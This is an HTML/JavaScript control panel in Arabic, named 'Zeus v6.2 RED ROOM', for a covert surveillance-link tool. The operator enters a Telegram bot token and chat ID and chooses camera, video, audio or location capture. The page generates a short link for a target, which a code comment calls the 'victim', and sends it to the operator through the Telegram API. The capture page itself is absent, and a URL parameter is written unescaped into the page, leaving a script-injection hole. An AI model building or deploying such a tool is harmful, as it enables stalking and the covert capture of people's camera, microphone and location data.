<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝒁𝒆𝒖𝒔 · v6.2 (بسيط وفعال)</title>
  <style>
    body {
      background: #0a0202;
      color: #f0e6e6;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      direction: rtl;
    }
    .container {
      background: #160404;
      border: 1px solid #ff003388;
      border-radius: 16px;
      padding: 30px 25px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 0 50px rgba(255,0,51,0.15);
    }
    h1 {
      font-size: 26px;
      color: #ff0033;
      text-align: center;
      margin: 0 0 10px 0;
      letter-spacing: 2px;
      text-shadow: 0 0 20px #ff003355;
    }
    .sub {
      text-align: center;
      color: #f0e6e688;
      font-size: 14px;
      margin-bottom: 20px;
    }
    .field {
      margin-bottom: 18px;
    }
    .field label {
      display: block;
      font-size: 13px;
      color: #ff0033aa;
      margin-bottom: 5px;
      letter-spacing: 0.5px;
    }
    .field input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #ff003355;
      background: #0d0202;
      color: #f0e6e6;
      font-size: 14px;
      box-sizing: border-box;
      direction: ltr;
      text-align: left;
    }
    .field input::placeholder {
      color: #f0e6e644;
    }
    .features {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 8px;
      margin: 12px 0 18px;
    }
    .feature-item {
      background: #1a0808;
      border: 1px solid #ff003333;
      border-radius: 8px;
      padding: 8px 4px;
      text-align: center;
      cursor: pointer;
      transition: 0.2s;
      font-size: 13px;
      color: #f0e6e688;
    }
    .feature-item.active {
      border-color: #ff0033;
      background: #2a0808;
      color: #ff0033;
      box-shadow: 0 0 20px #ff003322;
    }
    .feature-item input {
      display: none;
    }
    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(145deg, #2a0000, #0d0000);
      color: #f0e6e6;
      font-size: 18px;
      font-weight: bold;
      letter-spacing: 2px;
      border: 1px solid #ff003388;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 0 #4a0000, 0 8px 25px #00000099;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 4px 0 #5a0000, 0 12px 35px #000000cc;
    }
    .btn:active:not(:disabled) {
      transform: translateY(4px);
      box-shadow: 0 2px 0 #3a0000;
    }
    .btn:disabled {
      opacity: 0.5;
      transform: translateY(2px);
      box-shadow: 0 3px 0 #3a0000;
      cursor: not-allowed;
    }
    .result {
      margin-top: 20px;
      padding: 16px;
      border: 1px solid #ff003366;
      border-radius: 10px;
      background: #0d0202;
      display: none;
      text-align: center;
    }
    .result .short {
      font-size: 22px;
      font-weight: bold;
      color: #ff0033;
      letter-spacing: 3px;
      word-break: break-all;
      margin: 6px 0;
    }
    .result .link {
      color: #f0e6e6cc;
      font-size: 14px;
      word-break: break-all;
      background: #00000044;
      padding: 8px;
      border-radius: 6px;
      margin: 8px 0;
    }
    .result .actions {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-top: 10px;
    }
    .result .actions button {
      background: #1a0808;
      border: 1px solid #ff003366;
      color: #f0e6e6;
      padding: 6px 16px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
      transition: 0.15s;
    }
    .result .actions button:hover {
      background: #2a0808;
      border-color: #ff0033;
    }
    .log {
      margin-top: 16px;
      padding: 10px 14px;
      border: 1px solid #ff003322;
      border-radius: 8px;
      background: #0a0202;
      font-family: monospace;
      font-size: 13px;
      color: #f0e6e688;
      min-height: 50px;
      direction: ltr;
      text-align: left;
    }
    .log .prompt {
      color: #ff0033;
    }
    .footer {
      margin-top: 16px;
      text-align: center;
      font-size: 12px;
      color: #f0e6e644;
      letter-spacing: 1px;
    }
    .error {
      color: #ff6633;
      font-size: 13px;
      margin-top: 6px;
    }
    #botList {
      margin-top: 12px;
      border-top: 1px solid #ff003322;
      padding-top: 12px;
    }
    #botList .item {
      display: flex;
      justify-content: space-between;
      padding: 4px 0;
      border-bottom: 1px solid #ff003311;
      font-size: 13px;
      direction: ltr;
    }
    #botList .item .del {
      color: #ff003388;
      cursor: pointer;
    }
    #botList .item .del:hover {
      color: #ff0033;
    }
  </style>
</head>
<body>
<div class="container">
  <h1>𝒁𝒆𝒖𝒔 · v6.2</h1>
  <div class="sub">‹ رابط فوري · بدون تعقيد ›</div>

  <form id="form">
    <div class="field">
      <label>🤖 توكن البوت</label>
      <input type="text" id="botToken" placeholder="أدخل توكن البوت (مثل 123456:ABC-DEF)" required>
    </div>
    <div class="field">
      <label>🆔 معرف المحادثة (Chat ID)</label>
      <input type="text" id="chatId" placeholder="مثل 123456789" required>
    </div>

    <div style="font-size:13px; color:#ff003388; margin-bottom:6px;">⚙️ الميزات المطلوبة (اختر ما تريد)</div>
    <div class="features" id="featuresContainer">
      <label class="feature-item active" data-val="camFront">📷 أمامي<input type="checkbox" checked></label>
      <label class="feature-item" data-val="camBack">📷 خلفي<input type="checkbox"></label>
      <label class="feature-item" data-val="videoFront">🎥 فيديو أمامي<input type="checkbox"></label>
      <label class="feature-item" data-val="videoBack">🎥 فيديو خلفي<input type="checkbox"></label>
      <label class="feature-item" data-val="audio">🎤 تسجيل صوتي<input type="checkbox"></label>
      <label class="feature-item" data-val="location">📍 موقع<input type="checkbox"></label>
    </div>

    <button class="btn" id="generateBtn" type="submit">⚡ توليد الرابط</button>
    <div id="formError" class="error"></div>
  </form>

  <!-- نتيجة الرابط -->
  <div class="result" id="resultBox">
    <div>✅ تم إنشاء الرابط</div>
    <div class="short" id="shortTokenDisplay">------</div>
    <div class="link" id="fullLinkDisplay">https://...</div>
    <div class="actions">
      <button id="copyBtn">📋 نسخ</button>
      <button id="openBtn">🔗 فتح</button>
    </div>
  </div>

  <!-- سجل الأحداث -->
  <div class="log" id="log">
    <div><span class="prompt">$</span> جاهز لتوليد رابط<span class="cursor">█</span></div>
  </div>

  <!-- قائمة الروابط المخزنة -->
  <div id="botList">
    <div style="font-size:12px; color:#ff003366; margin-bottom:4px;">📦 الروابط المخزنة</div>
    <div id="listItems"></div>
  </div>

  <div class="footer">◆ XX_8K · RED ROOM v6.2 ◆</div>
</div>

<script>
  // ===== 100% بسيط وفعال =====

  // --- العناصر ---
  const form = document.getElementById('form');
  const botTokenInput = document.getElementById('botToken');
  const chatIdInput = document.getElementById('chatId');
  const generateBtn = document.getElementById('generateBtn');
  const resultBox = document.getElementById('resultBox');
  const shortDisplay = document.getElementById('shortTokenDisplay');
  const fullLinkDisplay = document.getElementById('fullLinkDisplay');
  const copyBtn = document.getElementById('copyBtn');
  const openBtn = document.getElementById('openBtn');
  const logDiv = document.getElementById('log');
  const errorDiv = document.getElementById('formError');
  const listItems = document.getElementById('listItems');

  // --- تفعيل / تعطيل الميزات بالنقر ---
  document.querySelectorAll('.feature-item').forEach(item => {
    item.addEventListener('click', function(e) {
      const cb = this.querySelector('input[type="checkbox"]');
      cb.checked = !cb.checked;
      this.classList.toggle('active', cb.checked);
    });
    // منع انتشار النقر على checkbox نفسه
    item.querySelector('input').addEventListener('click', function(e) {
      e.stopPropagation();
    });
  });

  // --- وظيفة تسجيل الرسائل في السجل ---
  function logMessage(msg) {
    const time = new Date().toLocaleTimeString();
    logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
    if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
  }

  // --- وظيفة عرض الخطأ ---
  function setError(msg) {
    errorDiv.textContent = msg;
    if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
  }

  // --- توليد رمز قصير عشوائي (6 أحرف) ---
  function generateShort() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let token = '';
    for (let i = 0; i < 6; i++) token += chars[Math.floor(Math.random() * chars.length)];
    return token;
  }

  // --- الحصول على جميع البيانات المخزنة ---
  function getStorage() {
    try {
      return JSON.parse(localStorage.getItem('zeus_bots') || '{}');
    } catch { return {}; }
  }

  // --- حفظ البيانات ---
  function saveStorage(data) {
    localStorage.setItem('zeus_bots', JSON.stringify(data));
  }

  // --- تحديث قائمة الروابط المخزنة ---
  function renderList() {
    const data = getStorage();
    const keys = Object.keys(data);
    if (keys.length === 0) {
      listItems.innerHTML = '<div style="color:#666;font-size:12px;">لا توجد روابط</div>';
      return;
    }
    let html = '';
    keys.forEach(key => {
      const entry = data[key];
      html += `<div class="item">
                <span style="color:#ff0033;">${entry.shortToken}</span>
                <span style="color:#888;font-size:12px;">${entry.features || ''}</span>
                <span class="del" data-token="${key}">✕</span>
              </div>`;
    });
    listItems.innerHTML = html;
    // ربط أحداث الحذف
    document.querySelectorAll('.item .del').forEach(el => {
      el.addEventListener('click', function() {
        const token = this.dataset.token;
        const data = getStorage();
        delete data[token];
        saveStorage(data);
        renderList();
        logMessage(`🗑️ حذف الرابط ${token}`);
      });
    });
  }

  // --- عرض الرابط الناتج ---
  function showResult(shortToken) {
    const base = window.location.origin + window.location.pathname;
    const link = `${base}?t=${shortToken}`;
    shortDisplay.textContent = shortToken;
    fullLinkDisplay.textContent = link;
    resultBox.style.display = 'block';
    // تمرير سلس
    resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }

  // --- نسخ الرابط ---
  copyBtn.addEventListener('click', function() {
    const text = fullLinkDisplay.textContent;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => {
        this.textContent = '✅ تم';
        setTimeout(() => this.textContent = '📋 نسخ', 1500);
      }).catch(() => fallbackCopy(text));
    } else {
      fallbackCopy(text);
    }
  });
  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    copyBtn.textContent = '✅ تم';
    setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
  }

  // --- فتح الرابط ---
  openBtn.addEventListener('click', function() {
    window.open(fullLinkDisplay.textContent, '_blank');
  });

  // --- إرسال الرابط إلى المستخدم عبر البوت ---
  async function sendLinkToUser(botToken, chatId, shortToken) {
    const base = window.location.origin + window.location.pathname;
    const link = `${base}?t=${shortToken}`;
    const msg = `🔗 *رابطك الجديد*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
    try {
      const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
      });
      const json = await resp.json();
      if (json.ok) {
        logMessage('✅ تم إرسال الرابط إلى المستخدم');
        return true;
      } else {
        logMessage('⚠️ فشل إرسال الرابط: ' + (json.description || 'خطأ غير معروف'));
        return false;
      }
    } catch (e) {
      logMessage('❌ خطأ في إرسال الرابط: ' + e.message);
      return false;
    }
  }

  // --- معالج النموذج (الحدث الرئيسي) ---
  form.addEventListener('submit', async function(e) {
    e.preventDefault();   // منع إعادة تحميل الصفحة
    setError('');

    const botToken = botTokenInput.value.trim();
    const chatId = chatIdInput.value.trim();

    if (!botToken || !chatId) {
      setError('❌ يرجى ملء جميع الحقول');
      return;
    }

    // تعطيل الزر أثناء العمل
    generateBtn.disabled = true;
    generateBtn.textContent = '⏳ جاري التوليد...';
    logMessage('⏳ بدء توليد الرابط...');

    try {
      // 1. جمع الميزات المختارة
      const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
      const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');

      // 2. قراءة البيانات المخزنة
      const data = getStorage();

      // 3. التحقق من وجود توكن مكرر
      if (data[botToken]) {
        const existing = data[botToken];
        // تحديث الميزات إذا تغيرت
        if (existing.features !== features) {
          existing.features = features;
          existing.updated = Date.now();
          saveStorage(data);
          logMessage('🔄 تحديث ميزات الرابط السابق');
        }
        showResult(existing.shortToken);
        // إرسال الرابط مرة أخرى
        await sendLinkToUser(botToken, chatId, existing.shortToken);
        renderList();
        generateBtn.disabled = false;
        generateBtn.textContent = '⚡ توليد الرابط';
        return;
      }

      // 4. توليد رمز قصير جديد
      let shortToken;
      let attempts = 0;
      const existingTokens = Object.values(data).map(e => e.shortToken);
      do {
        shortToken = generateShort();
        attempts++;
      } while (existingTokens.includes(shortToken) && attempts < 50);

      // 5. حفظ البيانات
      data[botToken] = {
        chatId: chatId,
        features: features,
        shortToken: shortToken,
        createdAt: Date.now(),
        updated: Date.now()
      };
      saveStorage(data);
      logMessage('✅ تم حفظ الرابط الجديد');

      // 6. عرض النتيجة
      showResult(shortToken);

      // 7. إرسال الرابط للمستخدم
      await sendLinkToUser(botToken, chatId, shortToken);

      // 8. تحديث القائمة
      renderList();

    } catch (err) {
      logMessage('❌ خطأ: ' + err.message);
      setError('حدث خطأ: ' + err.message);
    } finally {
      generateBtn.disabled = false;
      generateBtn.textContent = '⚡ توليد الرابط';
    }
  });

  // --- تهيئة الصفحة ---
  renderList();
  logMessage('𝒁𝒆𝒖𝒔 v6.2 جاهز — انتظر إدخال البيانات');

  // استعادة آخر بيانات مدخلة (اختياري)
  try {
    const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
    if (last.botToken) botTokenInput.value = last.botToken;
    if (last.chatId) chatIdInput.value = last.chatId;
  } catch {}

  // حفظ المدخلات تلقائياً لتجنب فقدانها عند التحديث
  botTokenInput.addEventListener('change', () => {
    localStorage.setItem('zeus_last_input', JSON.stringify({
      botToken: botTokenInput.value,
      chatId: chatIdInput.value
    }));
  });
  chatIdInput.addEventListener('change', () => {
    localStorage.setItem('zeus_last_input', JSON.stringify({
      botToken: botTokenInput.value,
      chatId: chatIdInput.value
    }));
  });

  // إظهار الرابط إن وجد في الرابط (لمن دخل عبر الرابط)
  (function checkURL() {
    const params = new URLSearchParams(window.location.search);
    const t = params.get('t');
    if (t) {
      // نحن في صفحة الضحية، لكن هذه النسخة لا تحتوي على واجهة ضحية، لذا فقط ننبه
      // يمكن إعادة توجيه أو عرض رسالة
      document.querySelector('.container').innerHTML = `
        <h1>🔐 رابط صالح</h1>
        <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${t}</strong></p>
        <p style="color:#888;font-size:14px;">سيتم طلب الصلاحيات في النسخة الكاملة.</p>
        <p style="margin-top:20px;"><a href="${window.location.pathname}" style="color:#ff0033;">↩ العودة إلى لوحة التحكم</a></p>
      `;
    }
  })();

  console.log('✅ 𝒁𝒆𝒖𝒔 v6.2 (بسيط وفعال) جاهز');
</script>
</body>
</html>
